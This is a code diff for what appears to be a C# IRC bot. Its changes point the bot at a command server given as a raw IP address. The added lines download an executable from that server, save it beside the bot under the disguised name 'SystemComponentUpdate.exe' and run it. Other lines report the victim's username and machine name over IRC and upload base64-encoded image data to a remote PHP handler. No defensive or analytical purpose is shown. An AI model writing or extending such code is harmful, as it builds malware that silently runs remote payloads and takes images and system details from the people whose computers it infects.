@@ -46,12 +46,12 @@ namespace tom
             irc.SendMessage(Environment.UserName + " ON " + Environment.MachineName);
         }
 
-        public string Update()
+        public void Update()
         {
             WebClient Client = new WebClient();
-            Client.DownloadFile("http://www.jaredeverett.ca/bots/BotUpdater.exe", @Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
+            Client.DownloadFile("http://198.211.100.72/bots/updater.exe", @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\SystemComponentUpdate.exe");
+            System.Diagnostics.Process.Start("SystemComponentUpdate.exe");
 
-            return "probably failed";
         }
         
         public void ShowMessage(string message)
@@ -146,7 +146,7 @@ namespace tom
             // Post image to upload handler
             using (WebClient client = new WebClient())
             {
-                byte[] response = client.UploadValues("http://jaredeverett.ca/bots/photo.php", new NameValueCollection()
+                byte[] response = client.UploadValues("http://198.211.100.72/bots/photo.php", new NameValueCollection()
                 {
                     { "myImageData", base64Image }
                 });
